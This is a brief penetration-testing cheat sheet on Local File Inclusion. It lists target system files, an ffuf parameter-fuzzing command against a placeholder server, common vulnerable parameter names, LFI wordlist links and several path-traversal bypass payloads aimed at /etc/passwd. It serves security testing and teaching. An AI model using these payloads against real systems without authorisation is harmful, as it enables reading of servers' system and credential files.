### **Testing for Local File Inclusion**
- This vulnerability happens when a website allows you to choose a file to display without applying any filtering or security checks. If the input isn’t properly validated, an attacker can insert a path to files on the server and make the website display them. 
         
### **Common Files to Try**
- Linux: /etc/passwd
- Windows: C:\Windows\boot.ini

### **Fuzzing Parameters**
- Start by fuzzing for potentially injectable parameters using a common wordlist:
  ```
  ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
  -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value'
  ```
           
- This helps you find parameters like:
  ```
  ?dir={payload}
  ?action={payload}
  ?date={payload}
  ?detail={payload}
  ?file={payload}
  ?download={payload}
  ?path={payload}
  ?folder={payload}
  ?include={payload}
  ?page={payload}
  ?locate={payload}
  ?site={payload}
    ```
           
### **Searching for Sensitive Files** 
- Linux Wordlist:
  ```
  https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
  ```
- Windows Wordlist:
  ```
  https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows
  ```
          
### **Bypasses**
```
....//....//etc/passwd
..////../..////etc/passwd
/%5C../%5C../%5C../etc/passwd
....////....////....////etc/passwd
../../../../../../../../../../../../etc/passwd
```
       
